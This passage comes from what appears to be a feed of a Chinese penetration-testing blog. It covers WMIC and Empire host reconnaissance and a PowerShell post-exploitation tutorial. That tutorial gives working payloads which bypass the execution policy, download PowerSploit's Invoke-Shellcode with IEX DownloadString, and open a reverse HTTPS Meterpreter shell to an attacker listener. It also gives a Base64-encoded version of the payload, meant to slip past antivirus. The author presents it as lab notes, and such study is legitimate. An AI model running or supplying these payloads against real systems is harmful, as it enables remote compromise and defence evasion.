class="headerlink" title="0x02 自动收集信息"></a>0x02 自动收集信息</h2><p>为了简化前面手动收集信息的操作，我们可以直接创建一个脚本文件来自动完成前面的信息查询等工作。这里推荐一个使用WMIC收集目标机器信息的脚本。</p><p>WMIC（Windows Management Instrumentation Command-Line，Windows管理工具命令行）是最有用的Windows命令行工具。在默认情况下，任何版本的Windows XP的低权限用户不能访问WMIC，Windows 7以上版本的低权限用户允许访问WMIC并执行相关操作。</p><p>下载地址：<a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar" target="_blank" rel="noopener">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><p>我们可简单看下它的代码，其实就是执行一些wmic查询命令然后保存到html文件中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;delims=&quot; %%A in (&apos;dir /s /b %WINDIR%\system32\*htable.xsl&apos;) do set &quot;var=%%A&quot;</span><br><span class="line"></span><br><span class="line">wmic process get CSName,Description,ExecutablePath,ProcessId /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic USERACCOUNT list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic group list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic nicconfig where IPEnabled=&apos;true&apos; get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic netuse list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic startup get Caption,Command,Location,User /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic Timezone get DaylightName,Description,StandardName /format:&quot;%var%&quot; &gt;&gt; out.html</span><br></pre></td></tr></table></figure><p>执行该脚本后，会在本地生成一个HTML文件来保存结果：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/25.png" alt=""></p><h2 id="0x03-Empire下的主机信息收集"><a href="#0x03-Empire下的主机信息收集" class="headerlink" title="0x03 Empire下的主机信息收集"></a>0x03 Empire下的主机信息收集</h2><p>Empire是针对Windows系统的后渗透神器，包括了从stager生成、提权到渗透维持的一系列功能。</p><p>官网：<a href="http://www.powershellempire.com/" target="_blank" rel="noopener">http://www.powershellempire.com/</a></p><p>下面只做下笔记，就不自己折腾了。</p><p>Empire提供了用于收集主机信息的模块。输入如下命令即可查看本机用户、域组成员、密码设置时间、剪贴板内容、系统基本信息、网络适配器信息、共享信息等：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness/host/winenum</span><br></pre></td></tr></table></figure><p>此外，situational_awareness/host/computerdetails模块几乎包含了系统中所有有用的信息，比如目标主机事件日志、应用程序控制策略日志，包括RDP登录信息、PowerShell脚本运行和保存的信息等。注意，该模块需要管理员权限运行。</p><h2 id="0x04-查询当前权限"><a href="#0x04-查询当前权限" class="headerlink" title="0x04 查询当前权限"></a>0x04 查询当前权限</h2><h3 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><p>通过该命令，我们一般可以区分出当前用户是属于以下哪种用户：</p><ul><li>本地普通用户</li><li>本地管理员用户</li><li>域内用户</li></ul><p>在这三种情况下，如果当前内网中存在域，那么本地普通用户是查询不到内网域信息的，而只能查询本机相关信息，但是本机管理员用户和域内用户则可以查询域内信息。</p><p>其原理在于：域内的所有查询都是通过DC实现的（基于LDAP协议），而这个查询需要经过权限认证，所以只有域用户才拥有这个权限；当域用户执行查询命令时，会自动使用Kerberos协议进行认证，无须额外输入账号密码。</p><p>本地管理员Administrator权限可以直接提升为Ntauthority或System权限，因此在域中除了普通用户外，所有的机器都有一个机器用户（用户名是机器名加上“$”）。在本质上，机器的System用户对应的就是域里面的机器用户。所以，使用System权限可以运行域内的查询命令。</p><p>比如这里是hacker域内的testuser用户：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/26.png" alt=""></p><h3 id="获取域SID"><a href="#获取域SID" class="headerlink" title="获取域SID"></a>获取域SID</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure><p>可以看到当前域hacker的SID为S-1-5-21-554479669-3187065311-1765148423，域用户testuser的SID为S-1-5-21-554479669-3187065311-1765148423-1105：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/27.png" alt=""></p><h3 id="查询指定用户的详细信息"><a href="#查询指定用户的详细信息" class="headerlink" title="查询指定用户的详细信息"></a>查询指定用户的详细信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user xxx /domain</span><br></pre></td></tr></table></figure><p>输入该命令可以看到当前用户在本地组中有没有本地管理员权限，属于哪个域等。</p><p>这里看到testuser用户在本地组并没有本地管理员权限，在域中属于Domain Users组：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/28.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透之Windows PowerShell基础</title>
    <link href="https://www.mi1k7ea.com/2020/02/18/Windows-PowerShell%E5%9F%BA%E7%A1%80/"/>
    <id>https://www.mi1k7ea.com/2020/02/18/Windows-PowerShell基础/</id>
    <published>2020-02-18T13:51:31.000Z</published>
    <updated>2020-02-27T15:36:06.773Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>主要参考《内网安全攻防》。</p><p>更多PowerShell的内容可参考：<a href="https://www.pstips.net/powershell-online-tutorials" target="_blank" rel="noopener">https://www.pstips.net/powershell-online-tutorials</a></p><h2 id="0x01-PowerShell基本概念"><a href="#0x01-PowerShell基本概念" class="headerlink" title="0x01 PowerShell基本概念"></a>0x01 PowerShell基本概念</h2><p>Windows PowerShell是一种命令行外壳程序和脚本环境，可以看作是命令行提示符cmd.exe的扩展，其使命令行用户和脚本编写者可以利用.NET Framework的强大功能。只要可以在一台计算机上运行代码，就可以将PowerShell脚本文件（.ps1）下载到磁盘中执行（甚至无须将脚本文件写到磁盘中）。</p><p>PowerShell需要.NET环境的支持，同时支持.NET对象，其拥有以下特点：</p><ul><li>在Windows 7以上版本是默认安装的；</li><li>脚本可以在内存中运行，不需要写入磁盘；</li><li>几乎不会触发杀毒软件；</li><li>可远程执行；</li><li>目前很多工具都是局域PowerShell开发的；</li><li>使Windows脚本的执行更为容易；</li><li>cmd.exe的运行通常会被阻止，但PowerShell的运行通常不会被阻止；</li><li>可用于管理活动目录；</li></ul><p>通过以下两个命令都可以查看PowerShell的版本：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PS E:\&gt; <span class="built_in">Get-Host</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Name             : ConsoleHost</span><br><span class="line">Version          : <span class="number">5.1</span>.<span class="number">18362.628</span></span><br><span class="line">InstanceId       : <span class="number">33</span>a7b882-<span class="number">5</span>b06-<span class="number">494</span>a-<span class="number">9577</span>-ed0f51a6e8ad</span><br><span class="line">UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface</span><br><span class="line">CurrentCulture   : zh-CN</span><br><span class="line">CurrentUICulture : zh-CN</span><br><span class="line">PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy</span><br><span class="line">DebuggerEnabled  : True</span><br><span class="line">IsRunspacePushed : False</span><br><span class="line">Runspace         : System.Management.Automation.Runspaces.LocalRunspace</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS E:\&gt; <span class="variable">$PSVersionTable</span>.PSVersion</span><br><span class="line"></span><br><span class="line">Major  Minor  Build  Revision</span><br><span class="line">-----  -----  -----  --------</span><br><span class="line"><span class="number">5</span>      <span class="number">1</span>      <span class="number">18362</span>  <span class="number">628</span></span><br></pre></td></tr></table></figure><h2 id="0x02-PowerShell脚本"><a href="#0x02-PowerShell脚本" class="headerlink" title="0x02 PowerShell脚本"></a>0x02 PowerShell脚本</h2><p>PowerShell脚本其实就是一个扩展名为”.ps1”的文件，其中包含一系列PowerShell命令，每个命令显示为独立的一行。</p><h3 id="脚本运行"><a href="#脚本运行" class="headerlink" title="脚本运行"></a>脚本运行</h3><p>运行PowerShell脚本需要输入绝对路径，比如<code>E:\test.ps1</code>。如果PowerShell脚本刚好在系统目录中，则只需要<code>.\test.ps1</code>执行即可，这和Linux上执行Shell脚本是一样的。</p><p>当然，PowerShell是分32位和64位的。在64位的Windows上，同时存在x64和x86两个版本的PowerShell，并且这两个版本的执行策略互不影响，即相互独立。</p><p>x64版本的PowerShell的配置文件在<code>%WinDir%\SysWOW64\WindowsPowerShell\v1.0\</code>目录下。</p><p>运行32位PowerShell脚本命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br></pre></td></tr></table></figure><p>运行64位PowerShell脚本命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%WinDir%\SysWOW64\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br></pre></td></tr></table></figure><h3 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h3><p>为了防止使用者运行恶意脚本，PowerShell提供了一个执行策略。在默认情况下，这个执行策略被设置为“不能运行”。</p><p>如果PowerShell脚本不能运行，可以使用如下的cmdlet命令查询当前的执行策略：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS E:\&gt; <span class="built_in">Get-ExecutionPolicy</span></span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure><p>这里看到是Restricted即限制不能执行的意思。我们看下执行策略的几个值：</p><ul><li>Restricted：脚本不能运行（默认设置）；</li><li>RemoteSigned：在本地创建的脚本可以运行，但不能运行网上下载的脚本（拥有数字证书的除外）；</li><li>AllSigned：仅当脚本由受信任的发布者签名时才能运行；</li><li>Unrestricted：允许所有脚本运行；</li></ul><p>可以使用下面的cmdlet命令设置PowerShell的执行策略：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS E:\&gt; <span class="built_in">Set-ExecutionPolicy</span> &lt;policy name&gt;</span><br></pre></td></tr></table></figure><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><p>在PowerShell中也支持管道符<code>|</code>的使用。</p><p>管道的作用就是将一个命令的输出作为另一个命令的输入，两个命令之间用<code>|</code>连接。</p><h2 id="0x03-PowerShell常用命令与利用技巧"><a href="#0x03-PowerShell常用命令与利用技巧" class="headerlink" title="0x03 PowerShell常用命令与利用技巧"></a>0x03 PowerShell常用命令与利用技巧</h2><p>在Windows命令提示符即cmd.exe中输入<code>powershell</code>命令即可切入PowerShell命令行环境。也可以直接在当前目录Shift+右键&gt;在此处打开PowerShell窗口（win10）。其中输入help命令可以显示帮助菜单：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;powershell</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">尝试新的跨平台 PowerShell https://aka.ms/pscore6</span><br><span class="line"></span><br><span class="line">PS E:\&gt; help</span><br><span class="line"></span><br><span class="line">主题</span><br><span class="line">Windows PowerShell 帮助系统</span><br><span class="line"></span><br><span class="line">简短说明</span><br><span class="line">显示有关 Windows PowerShell 的 cmdlet 及概念的帮助。</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>在PowerShell中，类似cmd命令的命令称为cmdlet命令。两者的命名规范一致，都采用“动词-名词”的方式，动词部分一般是Add、New、Get、Set、Remove等。命令的别名一般兼容Windows Command和Linux Shell。另外PowerShell命令不区分大小写。</p><p>几个常用命令：</p><p><img src="/2020/02/18/Windows-PowerShell基础/4.png" alt=""></p><p>几个常用的文件操作命令：</p><p><img src="/2020/02/18/Windows-PowerShell基础/3.png" alt=""></p><p>下面以文件操作为例：</p><ul><li>新建目录：New-ltem whitecellclub-ltemType Directory；</li><li>新建文件：New-ltem light.txt-ltemType File；</li><li>删除目录：Remove-ltem whitecellclub；</li><li>显示文本内容：Get-Content test.txt；</li><li>设置文本内容：Set-Content test.txt-Value ‘’hello,word! ‘’；</li><li>追加内容：Add-Content light.txt-Value ‘’i love you ‘’；</li><li>清除内容：Clear-Content test.txt</li></ul><h3 id="PowerSploit——后渗透测试框架"><a href="#PowerSploit——后渗透测试框架" class="headerlink" title="PowerSploit——后渗透测试框架"></a>PowerSploit——后渗透测试框架</h3><p>PowerSploit是一款基于PowerShell的后渗透测试框架，其中包含很多PowerShell脚本，主要用于渗透测试中的信息收集、权限提升、权限维持。</p><p>项目地址：<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p><p>它包含以下几个模块：</p><ul><li>CodeExecution：在目标机器执行代码；</li><li>ScriptModification：修改或准备脚本以在受感染的计算机上执行；</li><li>Persistence：向PowerShell脚本添加持久性功能；</li><li>AntivirusBypass：使PowerShell绕过防病毒；</li><li>Exfiltration：窃取数据；</li><li>Mayhem：使用PowerShell引起一般的混乱；</li><li>Privesc：帮助提升目标特权的工具；</li><li>Recon：在渗透测试的侦察阶段提供帮助的工具；</li></ul><h3 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h3><p>由前面知道，要想运行PowerShell脚本，必须使用管理员权限将执行策略从Restricted改为Unrestricted。</p><h4 id="Bypass本地权限并执行"><a href="#Bypass本地权限并执行" class="headerlink" title="Bypass本地权限并执行"></a>Bypass本地权限并执行</h4><p>将PowerShell脚本文件test.ps1上传至目标服务器。在命令行环境下，执行如下命令，绕过安全策略，在目标服务器本地执行该脚本：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -File test.ps1</span><br></pre></td></tr></table></figure><p>示例：</p><p><img src="/2020/02/18/Windows-PowerShell基础/1.png" alt=""></p><p>在实际的内网渗透中，将PowerSploit中Privesc模块的<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener">PowerUp.ps1脚本</a>上传到目标服务器中，在目标本地执行脚本文件，命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command <span class="string">"&amp; &#123;Import-Module E:\PowerUp.ps1; Invoke-AllChecks&#125;"</span></span><br></pre></td></tr></table></figure><p><img src="/2020/02/18/Windows-PowerShell基础/2.png" alt=""></p><p>这里PowerUp旨在成为依赖错误配置的常见Windows特权升级向量的交换所。运行Invoke-AllChecks将输出所有可识别的漏洞以及任何滥用功能的规范。换句话说，Invoke-AllChecks函数将检查目标主机的攻击向量以进行权限提升</p><h4 id="从网站服务器中下载脚本，Bypass本地权限并隐藏执行"><a href="#从网站服务器中下载脚本，Bypass本地权限并隐藏执行" class="headerlink" title="从网站服务器中下载脚本，Bypass本地权限并隐藏执行"></a>从网站服务器中下载脚本，Bypass本地权限并隐藏执行</h4><p>下载脚本的命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass-WindowStyle Hidden-NoProfile-NonI IEX(New-ObjectNet.WebClient).DownloadString(<span class="string">"xxx.ps1"</span>);[Parameters]</span><br></pre></td></tr></table></figure><p>几个常用参数说明如下：</p><p>-ExecutionPolicy Bypass（-Exec Bypass）：绕过执行安全策略，这个参数非常重要。在默认 情况下，PowerShell 的安全策略规定了 PowerShell 不允许运行命令和文件。通过设置这个 参数，可以绕过任意安全保护规则。在渗透测试中，通常每次运行 PowerShell 脚本时都要 使用这个参数；</p><ul><li>-WindowStyle Hidden（-W Hidden）：隐藏窗口；</li><li>-Nonlnteractive（-NonI）：非交互模式。PowerShell不为用户提供交互的提示；</li><li>-NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件；</li><li>-noexit：执行后不退出Shell。这在使用键盘记录等脚本时非常重要；</li><li>-NoLogo：启动不显示版权标志的PowerShell；</li></ul><p>这里使用PowerSploit中CodeExecution模块中<a href="https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1" target="_blank" rel="noopener">Invoke-Shellcode.ps1</a>脚本在目标机器上执行Meterpreter Shell。</p><p>这里我们需要知道使用什么参数，直接看源码了解如何调用反向HTTPS Meterpreter Shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/5.png" alt=""></p><p>因此，最终构造如下payload：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonI IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">"https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1"</span>); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <span class="number">192.168</span>.<span class="number">10.137</span> -Lport <span class="number">666</span></span><br></pre></td></tr></table></figure><p>先在Kali上打开MSF，使用后门模块<code>exploit/multi/handler</code>，并选择payload为<code>windows/meterpreter/reverse_https</code>，接着设置监听地址和端口后启动监听：</p><p><img src="/2020/02/18/Windows-PowerShell基础/6.png" alt=""></p><p>然后在Win10中的PowerShell中输入payload，发现会报如下错误：</p><p><img src="/2020/02/18/Windows-PowerShell基础/7.png" alt=""></p><p>此时msf是接收到反弹的请求的，但是并不会成功获得反弹的Meterpreter Shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/8.png" alt=""></p><p>那我们换个环境，在Win7上测试一下，经过几番折腾，去掉几个payload的参数就能成功执行反弹shell（注意，在cmd命令行下双引号要改为单引号，不然报错）：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -NoProfile IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'</span>); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <span class="number">192.168</span>.<span class="number">10.137</span> -Lport <span class="number">666</span></span><br></pre></td></tr></table></figure><p>直接在win7的cmd中输入payload：</p><p><img src="/2020/02/18/Windows-PowerShell基础/9.png" alt=""></p><p>此时在Kali的msf中成功获取到Meterpreter Shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/10.png" alt=""></p><p>这里注意，不能直接在win7的PowerShell终端输入该payload，会显示如下错误：</p><p><img src="/2020/02/18/Windows-PowerShell基础/11.png" alt=""></p><p>这可能是win7和win10的PowerShell版本不一致导致的某些差异，具体原因还未知，但我们可以使用如下形式在win7的PowerShell终端来执行反弹shell，简单地说就是设置执行策略为无限制，然后直接远程下载恶意PowerShell脚本并执行：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Unrestricted; IEX(<span class="built_in">New-object</span> Net.WebClient).DownloadString(<span class="string">"https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1"</span>); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <span class="number">192.168</span>.<span class="number">10.137</span> -Lport <span class="number">666</span></span><br></pre></td></tr></table></figure><p><img src="/2020/02/18/Windows-PowerShell基础/12.png" alt=""></p><p>在msf中同样获取到反弹shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/13.png" alt=""></p><h4 id="使用Base64对PowerShell命令进行编码"><a href="#使用Base64对PowerShell命令进行编码" class="headerlink" title="使用Base64对PowerShell命令进行编码"></a>使用Base64对PowerShell命令进行编码</h4><p>使用Base64编码PowerShell命令可以起到混淆和压缩代码的作用，避免一些特殊字符导致脚本被杀毒软件所查杀。这里使用大佬写的一个Python脚本文件<a href="https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py" target="_blank" rel="noopener">ps_encoder.py</a>，其使用Base64编码封装的PowerShell命令包，其目的是混淆和压缩代码。</p><p>该脚本编码的对象必须是文本文件，这里需要先将命令保存为文本文件，然后调用该脚本编码即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># echo "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.10.137 -Lport 666 -Force" &gt;raw.txt</span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># cat raw.txt </span></span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'</span>); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.10.137 -Lport 666 -Force</span><br><span class="line">root@kali:~/Desktop<span class="comment"># chmod +x ps_encoder.py </span></span><br><span class="line">root@kali:~/Desktop<span class="comment"># python ps_encoder.py -s raw.txt</span></span><br><span class="line">SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMANwAgAC0ATABwAG8AcgB0ACAANgA2ADYAIAAtAEYAbwByAGMAZQAKAA==</span><br><span class="line">root@kali:~/Desktop<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>得到Base64编码后的命令内容之后，直接在目标主机的cmd终端上执行如下命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -NoP -NonI -Exec Bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMANwAgAC0ATABwAG8AcgB0ACAANgA2ADYAIAAtAEYAbwByAGMAZQAKAA==</span><br></pre></td></tr></table></figure><p>这里为了看下有没有错误就不添加<code>-W Hidden</code>参数设置隐藏窗口了，而且添加了还没成功反弹shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/14.png" alt=""></p><p>然后在Kali的msf中获取到Meterpreter Shell：</p><p><img src="/2020/02/18/Windows-PowerShell基础/15.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="Windows" scheme="https://www.mi1k7ea.com/tags/Windows/"/>
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透基础与域环境搭建</title>
    <link href="https://www.mi1k7ea.com/2020/02/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/"/>
    <id>https://www.mi1k7ea.com/2020/02/15/内网渗透基础/</id>
    <published>2020-02-15T12:34:33.000Z</published>
    <updated>2020-03-01T05:07:58.305Z</updated>
    
